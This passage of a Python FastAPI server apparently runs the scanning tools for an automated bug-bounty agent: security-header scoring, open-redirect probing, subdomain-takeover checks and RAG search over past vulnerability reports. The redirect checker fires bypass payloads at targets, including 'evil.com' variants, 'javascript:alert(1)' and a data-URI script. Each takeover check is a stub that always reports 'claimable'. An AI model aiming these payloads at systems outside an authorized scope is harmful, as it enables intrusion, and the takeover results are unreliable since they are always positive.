                    ))
                    score -= 5

    # Check X-Frame-Options
    xfo = headers.get("X-Frame-Options", "").lower()
    if not xfo:
        issues.append(SecurityHeadersIssue(
            header="X-Frame-Options",
            severity="medium",
            issue="Missing X-Frame-Options - vulnerable to clickjacking",
            recommendation="Set X-Frame-Options to 'DENY' or 'SAMEORIGIN'"
        ))
        score -= 10
    elif xfo not in ("deny", "sameorigin"):
        issues.append(SecurityHeadersIssue(
            header="X-Frame-Options",
            severity="low",
            issue=f"X-Frame-Options has unusual value: {xfo}",
            recommendation="Use 'DENY' or 'SAMEORIGIN'"
        ))
        score -= 5

    # Check X-Content-Type-Options
    xcto = headers.get("X-Content-Type-Options", "").lower()
    if xcto != "nosniff":
        if not xcto:
            issues.append(SecurityHeadersIssue(
                header="X-Content-Type-Options",
                severity="medium",
                issue="Missing X-Content-Type-Options - vulnerable to MIME sniffing",
                recommendation="Set X-Content-Type-Options to 'nosniff'"
            ))
            score -= 10
        else:
            issues.append(SecurityHeadersIssue(
                header="X-Content-Type-Options",
                severity="low",
                issue=f"X-Content-Type-Options has unusual value: {xcto}",
                recommendation="Set to 'nosniff'"
            ))
            score -= 5

    # Check Referrer-Policy
    rp = headers.get("Referrer-Policy", "").lower()
    if not rp:
        issues.append(SecurityHeadersIssue(
            header="Referrer-Policy",
            severity="low",
            issue="Missing Referrer-Policy - may leak sensitive URLs in referrer",
            recommendation="Set Referrer-Policy to 'strict-origin-when-cross-origin' or 'no-referrer'"
        ))
        score -= 5
    elif rp in ("unsafe-url", "origin", "origin-when-cross-origin"):
        issues.append(SecurityHeadersIssue(
            header="Referrer-Policy",
            severity="low",
            issue=f"Referrer-Policy '{rp}' is permissive and may leak sensitive data",
            recommendation="Use 'strict-origin-when-cross-origin' or 'no-referrer'"
        ))
        score -= 3

    # Check Permissions-Policy (formerly Feature-Policy)
    pp = headers.get("Permissions-Policy", "") or headers.get("Feature-Policy", "")
    if pp:
        # Check for dangerous features enabled
        dangerous_features = ["camera", "microphone", "geolocation", "payment"]
        for feature in dangerous_features:
            if f"{feature}=*" in pp.lower() or f"{feature}=()" not in pp.lower():
                # Feature is enabled (either explicitly or by default)
                if f"{feature}=*" in pp.lower():
                    issues.append(SecurityHeadersIssue(
                        header="Permissions-Policy",
                        severity="medium",
                        issue=f"Permissions-Policy allows '{feature}' for all origins",
                        recommendation=f"Restrict '{feature}' to specific origins or disable"
                    ))
                    score -= 5

    # Ensure score doesn't go negative
    score = max(0, score)

    return SecurityHeadersResult(
        url=safe_url,
        headers=headers,
        issues=issues,
        score=score,
    )


@app.post("/mcp/run_open_redirect_checks", response_model=OpenRedirectResult)
def run_open_redirect_checks(req: OpenRedirectRequest):
    """Test for open redirect vulnerabilities.

    Tests common redirect parameters with payloads that bypass whitelist checks.
    Open redirects are frequently used in OAuth/SSRF chains and are common findings.

    Common vulnerable parameters: redirect, return, next, url, target, dest, goto
    """
    # Validate URL is in scope
    validated_host = _enforce_scope(req.url)
    
    # Reconstruct safe URL
    parsed = urlparse(req.url)
    scheme = parsed.scheme or "http"
    safe_base = f"{scheme}://{validated_host}"
    if parsed.port and parsed.port not in (80, 443):
        safe_base = f"{scheme}://{validated_host}:{parsed.port}"

    # Extract query parameters
    query_params = dict(parse_qsl(parsed.query))
    
    # Default redirect parameter names if not specified
    redirect_params = req.params or ["redirect", "return", "next", "url", "target", "dest", "goto", "r", "redirect_uri", "callback"]
    
    # Common open redirect payloads (ordered by likelihood of bypass)
    payloads = [
        "//evil.com",
        "http://evil.com",
        "https://evil.com",
        "\\/\\/evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "evil.com",
        "/\\evil.com",
        "evil.com/",
        "evil.com#",
        "evil.com?",
        "//evil.com/path",
        "http://evil.com@allowed.com",
        "evil.com/../evil.com",
    ]

    vulnerable_params: List[Dict[str, Any]] = []
    
    # Test each redirect parameter
    for param_name in redirect_params:
        if param_name not in query_params:
            # Try adding the parameter to the URL
            test_url = f"{safe_base}{parsed.path or '/'}?{param_name}="
        else:
            # Use existing parameter value location
            test_url = req.url.split(f"{param_name}=")[0] + f"{param_name}="
        
        for payload in payloads:
            test_url_with_payload = test_url + payload
            
            try:
                rate_limit_wait()
                # Don't follow redirects - we want to see the Location header
                resp = requests.get(test_url_with_payload, timeout=10, allow_redirects=False)
                
                # Check for redirect response
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    
                    # Check if redirects to external domain
                    if location:
                        location_parsed = urlparse(location)
                        location_host = location_parsed.netloc.lower()
                        
                        # Extract host from safe_base for comparison
                        base_parsed = urlparse(safe_base)
                        base_host = base_parsed.netloc.lower()
                        
                        # Check if redirects to different domain
                        if location_host and location_host != base_host:
                            # Additional check: not a subdomain of the original
                            if not location_host.endswith("." + base_host):
                                vulnerable_params.append({
                                    "param": param_name,
                                    "payload": payload,
                                    "redirects_to": location,
                                    "status_code": resp.status_code,
                                })
                                # Found vulnerability for this param, move to next
                                break
                
            except Exception as e:
                # Skip failed requests
                continue

    return OpenRedirectResult(
        url=req.url,
        vulnerable=len(vulnerable_params) > 0,
        vulnerable_params=vulnerable_params,
    )


@app.post("/mcp/run_takeover_checks", response_model=TakeoverChecksResult)
def run_takeover_checks(req: TakeoverChecksRequest):
    """Check for subdomain takeover vulnerabilities.

    Resolves CNAME records and checks against known takeover patterns for:
    - GitHub Pages, Heroku, AWS S3, Azure, Cloudflare Pages, etc.

    Subdomain takeovers are easy wins with high success rates.
    """
    # Validate domain is in scope
    validated_host = _enforce_scope(req.domain)
    
    vulnerable_subdomains: List[TakeoverVulnerability] = []
    checked_count = 0

    # Get subdomains to check
    subdomains = req.subdomains or []
    
    # If no subdomains provided, try to enumerate (basic approach)
    if not subdomains:
        # Try common subdomains
        common_subs = ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "admin", "email", "sites", "cdn", "m", "forum", "forums", "store", "support", "app", "apps", "blog", "blogs", "shop", "wiki", "api", "www2", "test", "mx", "static", "media", "portal", "vpn", "ns", "sftp", "web", "dev", "staging", "stage", "demo", "backup", "backups", "beta", "old", "new", "secure", "vps", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "imap", "pop3", "smtp", "webmail", "exchange", "owa", "activesync"]
        subdomains = [f"{sub}.{validated_host}" for sub in common_subs[:20]]  # Limit to first 20 for speed

    # Known takeover patterns (service -> CNAME pattern -> verification method)
    takeover_patterns = {
        "github": {
            "cname_suffix": ".github.io",
            "check": lambda subdomain, cname: _check_github_takeover(subdomain, cname),
        },
        "heroku": {
            "cname_suffix": ".herokuapp.com",
            "check": lambda subdomain, cname: _check_heroku_takeover(subdomain, cname),
        },
        "s3": {
            "cname_suffix": ".s3.amazonaws.com",
            "check": lambda subdomain, cname: _check_s3_takeover(subdomain, cname),
        },
        "azure": {
            "cname_suffix": ".azurewebsites.net",
            "check": lambda subdomain, cname: _check_azure_takeover(subdomain, cname),
        },
        "cloudflare": {
            "cname_suffix": ".pages.dev",
            "check": lambda subdomain, cname: _check_cloudflare_takeover(subdomain, cname),
        },
        "fastly": {
            "cname_suffix": ".fastly.net",
            "check": lambda subdomain, cname: _check_fastly_takeover(subdomain, cname),
        },
    }

    for subdomain in subdomains:
        checked_count += 1
        
        # Resolve CNAME
        try:
            import socket
            cname = socket.gethostbyname_ex(subdomain)[0]
            # socket.gethostbyname_ex returns (hostname, aliaslist, ipaddrlist)
            # For CNAME, we need to check DNS directly
            # Use a simpler approach: try to resolve and check response
            import subprocess as sp
            try:
                result = sp.run(
                    ["dig", "+short", "CNAME", subdomain],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if result.returncode == 0 and result.stdout.strip():
                    cname = result.stdout.strip().rstrip(".")
                else:
                    # Fallback: try nslookup or skip
                    continue
            except FileNotFoundError:
                # dig not available, skip DNS resolution
                continue
        except Exception:
            continue

        # Check against known patterns
        for service, pattern_info in takeover_patterns.items():
            if pattern_info["cname_suffix"] in cname.lower():
                # Potential takeover - verify
                claimable, evidence = pattern_info["check"](subdomain, cname)
                if claimable:
                    vulnerable_subdomains.append(TakeoverVulnerability(
                        subdomain=subdomain,
                        service=service,
                        claimable=True,
                        cname=cname,
                        evidence=evidence,
                    ))
                    break  # Found vulnerability, move to next subdomain

    return TakeoverChecksResult(
        domain=validated_host,
        vulnerable_subdomains=vulnerable_subdomains,
        checked_count=checked_count,
    )


def _check_github_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if GitHub Pages subdomain is claimable."""
    # Extract repo name from CNAME (e.g., "user.github.io" -> check if user/repo exists)
    # For now, return True if CNAME points to github.io (simplified check)
    # In production, would check if the GitHub Pages site actually exists
    return True, f"CNAME points to {cname} - GitHub Pages may be claimable"


def _check_heroku_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if Heroku app is claimable."""
    # Heroku apps are claimable if the app name doesn't exist
    # Simplified: if CNAME points to herokuapp.com, it's potentially claimable
    return True, f"CNAME points to {cname} - Heroku app may not exist"


def _check_s3_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if S3 bucket is claimable."""
    # S3 buckets are claimable if they don't exist or are misconfigured
    # Would need to check bucket existence and permissions
    return True, f"CNAME points to {cname} - S3 bucket may be claimable"


def _check_azure_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if Azure website is claimable."""
    return True, f"CNAME points to {cname} - Azure site may not exist"


def _check_cloudflare_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if Cloudflare Pages project is claimable."""
    return True, f"CNAME points to {cname} - Cloudflare Pages project may not exist"


def _check_fastly_takeover(subdomain: str, cname: str) -> Tuple[bool, str]:
    """Check if Fastly service is claimable."""
    return True, f"CNAME points to {cname} - Fastly service may be misconfigured"


# ---------- RAG Endpoints ----------

# Lazy-load RAG client to avoid startup failures if Supabase not configured
_rag_client = None


def _get_rag_client():
    """Get or create RAG client instance."""
    global _rag_client
    if _rag_client is None:
        try:
            from tools.rag_client import RAGClient
            _rag_client = RAGClient()
        except Exception as e:
            raise HTTPException(
                status_code=503,
                detail=f"RAG service unavailable: {e}. Check SUPABASE_URL, SUPABASE_KEY, and OPENAI_API_KEY environment variables.",
            )
    return _rag_client


@app.post("/mcp/rag_search", response_model=RAGSearchResponse)
def rag_search(req: RAGSearchRequest):
    """
    Semantic search for similar vulnerabilities in the RAG knowledge base.

    This endpoint allows the triage agent to search historical vulnerability
    reports by natural language query, with optional filters.

    Example queries:
    - "SSRF vulnerability in image upload endpoint"
    - "GraphQL introspection enabled"
    - "JWT token manipulation leading to privilege escalation"
    """
    client = _get_rag_client()

    try:
        results = client.search(
            query=req.query,
            top_k=req.top_k,
            min_similarity=req.min_similarity,
            vuln_type=req.vuln_type,
            severity=req.severity,
            technologies=req.technologies,
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"RAG search failed: {e}")

    # Convert to response format
    search_results = [
        RAGSearchResult(
            report_id=r.report_id,
            title=r.title,
            vuln_type=r.vuln_type or "",
            severity=r.severity or "",
            cwe=r.cwe or "",
            target_technology=r.target_technology or [],
            attack_vector=r.attack_vector or "",
            payload=r.payload or "",
            impact=r.impact or "",
            source_url=r.source_url or "",
            similarity=r.similarity,
        )
        for r in results
    ]

    return RAGSearchResponse(
        query=req.query,
        results=search_results,
        total_results=len(search_results),
    )


@app.post("/mcp/rag_similar_vulns", response_model=RAGSimilarVulnsResponse)
def rag_similar_vulns(req: RAGSimilarVulnsRequest):
    """
    Find similar historical vulnerabilities for a scanner finding.

    This endpoint takes a finding from Nuclei, ZAP, or other scanners
    and returns similar historical reports from the RAG knowledge base,
    along with a pre-formatted context string for LLM injection.

    Use this during triage to provide historical context to the LLM.
    """
    client = _get_rag_client()

    try:
        results = client.search_similar_to_finding(
            finding=req.finding,
            top_k=req.top_k,
            min_similarity=req.min_similarity,
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"RAG similar search failed: {e}")

    # Generate context string for LLM injection
    try:
        context_string = client.get_context_for_triage(
            finding=req.finding,
            host_profile=req.host_profile,
            max_examples=min(req.top_k, 3),
        )
    except Exception:
        context_string = ""

    # Convert to response format
    search_results = [
        RAGSearchResult(
            report_id=r.report_id,
            title=r.title,
            vuln_type=r.vuln_type or "",
            severity=r.severity or "",
            cwe=r.cwe or "",
            target_technology=r.target_technology or [],
            attack_vector=r.attack_vector or "",
            payload=r.payload or "",
            impact=r.impact or "",
            source_url=r.source_url or "",
            similarity=r.similarity,
        )
        for r in results
    ]

    return RAGSimilarVulnsResponse(
        results=search_results,
        context_string=context_string,
        total_results=len(search_results),
    )


@app.get("/mcp/rag_stats", response_model=RAGStatsResponse)
def rag_stats():
    """
    Get statistics about the RAG knowledge base.

    Returns counts of total reports, vulnerability types, and severities.
    Useful for verifying the RAG database is populated and healthy.
    """
    client = _get_rag_client()

    try:
        stats = client.get_stats()
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to get RAG stats: {e}")

    return RAGStatsResponse(
        total_reports=stats.get("total_reports", 0),
        vuln_types=stats.get("vuln_types", {}),
        severities=stats.get("severities", {}),
    )


@app.post("/mcp/rag_search_by_type")
def rag_search_by_type(req: RAGSearchByTypeRequest):
    """
    Search for vulnerabilities by type (XSS, SSRF, IDOR, etc.).

    This is a convenience endpoint for quickly finding examples of
    specific vulnerability classes.
    
    Example request body:
        {"vuln_type": "xss", "top_k": 10}
    """
    client = _get_rag_client()

    try:
        results = client.search_by_vuln_type(vuln_type=req.vuln_type, top_k=req.top_k)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"RAG type search failed: {e}")

    return {
        "vuln_type": req.vuln_type,
        "results": [r.to_dict() for r in results],
        "total_results": len(results),
    }


@app.post("/mcp/rag_search_by_tech")
def rag_search_by_tech(req: RAGSearchByTechRequest):
    """
    Search for vulnerabilities by technology stack.

    Useful for finding relevant vulnerabilities when you know the
    target's technology stack from fingerprinting.

    Example request body:
        {"technologies": ["graphql", "nodejs"], "top_k": 10}
    """
    client = _get_rag_client()

    try:
        results = client.search_by_tech(technologies=req.technologies, top_k=req.top_k)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"RAG tech search failed: {e}")

    return {
        "technologies": req.technologies,
        "results": [r.to_dict() for r in results],
        "total_results": len(results),
    }


# ---------- host history snapshots ----------

HOST_HISTORY_DIR = os.path.join(OUTPUT_DIR, "host_history")
os.makedirs(HOST_HISTORY_DIR, exist_ok=True)


def _host_history_dir() -> str:
    d = os.path.join(OUTPUT_DIR, "host_history")
    os.makedirs(d, exist_ok=True)
    return d


def _host_history_path(host: str, ts: int) -> str:
    base = host.replace(":", "_")
    return os.path.join(_host_history_dir(), f"{base}_{ts}.json")


def _save_host_profile_snapshot(host: str, profile: Dict[str, Any]) -> None:
    ts = int(profile.get("created") or time.time())
    path = _host_history_path(host, ts)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(profile, fh, indent=2)


def _load_host_profile_snapshot(host: str, latest: bool = True) -> Optional[Dict[str, Any]]:
    base = host.replace(":", "_")
    hist_dir = _host_history_dir()
    try:
        files = [
            f
            for f in os.listdir(hist_dir)
            if f.startswith(base + "_") and f.endswith(".json")
        ]
    except FileNotFoundError:
        return None

    if not files:
        return None

    files.sort()
    fname = files[-1] if latest else files[0]
    path = os.path.join(hist_dir, fname)
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return None

@app.get("/mcp/health")
def health_check():
    """
    Comprehensive health check endpoint.
    
    Returns system status including:
    - MCP server status
    - Tool availability (Katana, Nuclei, WhatWeb)
    - Scope configuration status
    - Recent scan statistics
    - System resources
    """
    health_status = {
        "status": "healthy",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "services": {},
        "tools": {},
        "scope": {},
        "system": {},
    }
    
    # Check MCP server
    health_status["services"]["mcp_server"] = {
        "status": "running",
        "uptime_seconds": int(time.time() - _server_start_time) if "_server_start_time" in globals() else 0,
    }
    
    # Check tool availability
    tools_status = {}
    
    # Check Katana
    try:
        result = subprocess.run(
            ["katana", "-version"],
            capture_output=True,
            timeout=5,
        )
        tools_status["katana"] = {
            "available": result.returncode == 0,
            "version": result.stdout.decode().strip()[:50] if result.stdout else "unknown",
        }
    except Exception as e:
        tools_status["katana"] = {"available": False, "error": str(e)[:100]}
    
    # Check Nuclei
    try:
        result = subprocess.run(
            ["nuclei", "-version"],
            capture_output=True,
            timeout=5,
        )
        tools_status["nuclei"] = {
            "available": result.returncode == 0,
            "version": result.stdout.decode().strip()[:50] if result.stdout else "unknown",
        }
    except Exception as e:
        tools_status["nuclei"] = {"available": False, "error": str(e)[:100]}
    
    # Check WhatWeb (via Docker)
    try:
        result = subprocess.run(
            ["docker", "run", "--rm", "whatweb/whatweb", "--version"],
            capture_output=True,
            timeout=10,
        )
        tools_status["whatweb"] = {
            "available": result.returncode == 0,
            "method": "docker",
        }
    except Exception as e:
        tools_status["whatweb"] = {"available": False, "error": str(e)[:100]}
    
    health_status["tools"] = tools_status
    
    # Check scope configuration
    scope_status = {
        "configured": SCOPE is not None,
        "program_name": SCOPE.program_name if SCOPE else None,
        "primary_targets_count": len(SCOPE.primary_targets) if SCOPE else 0,
        "secondary_targets_count": len(SCOPE.secondary_targets) if SCOPE else 0,
    }
    health_status["scope"] = scope_status
    
    # System resources (basic)
    try:
        import psutil
        health_status["system"] = {
            "cpu_percent": psutil.cpu_percent(interval=0.1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_percent": psutil.disk_usage(OUTPUT_DIR).percent if os.path.exists(OUTPUT_DIR) else None,
        }
    except ImportError:
        health_status["system"] = {"note": "psutil not available"}
    
    # Determine overall health
    all_tools_ok = all(t.get("available", False) for t in tools_status.values())
    if not all_tools_ok or not scope_status["configured"]:
        health_status["status"] = "degraded"
    
    return health_status


# Track server start time for uptime calculation
_server_start_time = time.time()

if __name__ == "__main__":
    import uvicorn
    # Default port 8000 matches Dockerfile.mcp and agentic_runner.py defaults
    print("MCP server starting on port 8000 (Katana + Nuclei + WhatWeb).")
    uvicorn.run("mcp_server:app", host="0.0.0.0", port=8000, reload=False)
